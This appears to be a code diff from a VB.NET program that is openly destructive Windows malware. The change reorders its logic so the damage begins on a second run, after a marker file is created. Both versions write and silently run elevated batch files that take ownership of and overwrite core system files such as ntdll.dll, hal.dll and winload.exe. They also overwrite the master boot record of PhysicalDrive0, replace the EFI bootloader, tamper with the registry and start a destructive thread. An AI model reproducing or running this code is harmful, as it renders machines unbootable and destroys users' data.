@@ -170,48 +170,64 @@ Module Program
             Console.WriteLine("Error modifying Cursors registry: " & ex.Message)
         End Try
 
-        ' Start destructive tasks in a separate thread
-        Dim destructiveThread As New Thread(AddressOf PerformDestructiveTasks)
-        destructiveThread.Start()
-
         ' Perform resource-related tasks
         If File.Exists("C:\Windows\WinAttr.gci") Then
-            Dim files2owr() As String = {"winload.exe", "csrss.exe", "wininit.exe", "wininet.dll", "aclui.dll", "ADVAPI32.DLL", "crypt32.dll", "hal.dll", "logonui.exe", "ntdll.dll", "cryptbase.dll", "kernel32.dll", "userinit.exe", "crypt.dll", "chkdsk.exe"}
-            For Each fileName In files2owr
-                Dim currentDirectory As String = Environment.CurrentDirectory
-                Dim username As String = Environment.GetEnvironmentVariable("username")
-                Dim text As String = "@echo off" & vbNewLine & "cd %windir%\System32" & vbNewLine & "takeown /f " & fileName & vbNewLine & "icacls " & fileName & "/grant """ & username & """:F" & vbNewLine & "echo xa > """ & fileName & """"
-                File.WriteAllText("taskOverwrite.bat", text)
-
+            ' Check if emirhanucankek.txt exists
+            If Not File.Exists("C:\Windows\emirhanucankek.txt") Then
+                ' Create the file if it doesn't exist
                 Try
-                    Dim prc As New Process
-                    prc.StartInfo.FileName = "cmd.exe"
-                    prc.StartInfo.Arguments = "/c """ & currentDirectory & "\taskOverwrite.bat"""
-                    prc.StartInfo.Verb = "runas"
-                    prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
-                    prc.Start()
+                    File.Create("C:\Windows\emirhanucankek.txt").Dispose()
+                    Console.WriteLine("Created emirhanucankek.txt")
+                    ' Exit before doing destructive tasks
+                    Return
                 Catch ex As Exception
-                    Console.WriteLine("Error running batch file for " & fileName & ": " & ex.Message)
+                    Console.WriteLine("Error creating emirhanucankek.txt: " & ex.Message)
+                    Return
                 End Try
-            Next
+            Else
+                ' If file exists, continue with resource-related tasks
+                Dim files2owr() As String = {"winload.exe", "csrss.exe", "wininit.exe", "wininet.dll", "aclui.dll", "ADVAPI32.DLL", "crypt32.dll", "hal.dll", "logonui.exe", "ntdll.dll", "cryptbase.dll", "kernel32.dll", "userinit.exe", "crypt.dll", "chkdsk.exe"}
+                For Each fileName In files2owr
+                    ' Overwrite files using batch
+                    Dim currentDirectory As String = Environment.CurrentDirectory
+                    Dim username As String = Environment.GetEnvironmentVariable("username")
+                    Dim text As String = "@echo off" & vbNewLine & "cd %windir%\System32" & vbNewLine & "takeown /f " & fileName & vbNewLine & "icacls " & fileName & "/grant """ & username & """:F" & vbNewLine & "echo xa > """ & fileName & """"
+                    File.WriteAllText("taskOverwrite.bat", text)
 
-            ' Perform resource-related operations
-            WriteMBR("Resources\mrsmajor5mbr.bin", "\\.\PhysicalDrive0")
-            RunCommand("mountvol x: /s")
-            ExtractAndCopyEFI("Resources\bootmgfw.efi", "X:\EFI\Boot\Microsoft\bootmgfw.efi")
+                    Try
+                        Dim prc As New Process
+                        prc.StartInfo.FileName = "cmd.exe"
+                        prc.StartInfo.Arguments = "/c """ & currentDirectory & "\taskOverwrite.bat"""
+                        prc.StartInfo.Verb = "runas"
+                        prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                        prc.Start()
+                    Catch ex As Exception
+                        Console.WriteLine("Error running batch file for " & fileName & ": " & ex.Message)
+                    End Try
+                Next
+
+                ' Perform resource-related operations
+                WriteMBR("Resources\mrsmajor5mbr.bin", "\\.\PhysicalDrive0")
+                RunCommand("mountvol x: /s")
+                ExtractAndCopyEFI("Resources\bootmgfw.efi", "X:\EFI\Boot\Microsoft\bootmgfw.efi")
+
+                ' Show message box after resource tasks are done
+                MsgBox("You messed up... But if you don't click this message nothing's going to happen.", MsgBoxStyle.Critical, "uh oh")
+
+                ' Change the registry value back to 0 after showing the message box
+                Try
+                    Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
+                    reg.SetValue("DisableRegistryTools", 0)
+                    reg.Close()
+                Catch ex As Exception
+                    Console.WriteLine("Error changing DisableRegistryTools registry value back to 0: " & ex.Message)
+                End Try
+
+                ' Start destructive tasks in a separate thread
+                Dim destructiveThread As New Thread(AddressOf PerformDestructiveTasks)
+                destructiveThread.Start()
+            End If
         End If
-
-        ' Show message box after resource tasks are done
-        MsgBox("You messed up... But if you don't click this message nothing's going to happen.", MsgBoxStyle.Critical, "uh oh")
-
-        ' Change the registry value back to 0 after showing the message box
-        Try
-            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
-            reg.SetValue("DisableRegistryTools", 0)
-            reg.Close()
-        Catch ex As Exception
-            Console.WriteLine("Error changing DisableRegistryTools registry value back to 0: " & ex.Message)
-        End Try
 
         ' Continue with the rest of the tasks
         System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runprotector))
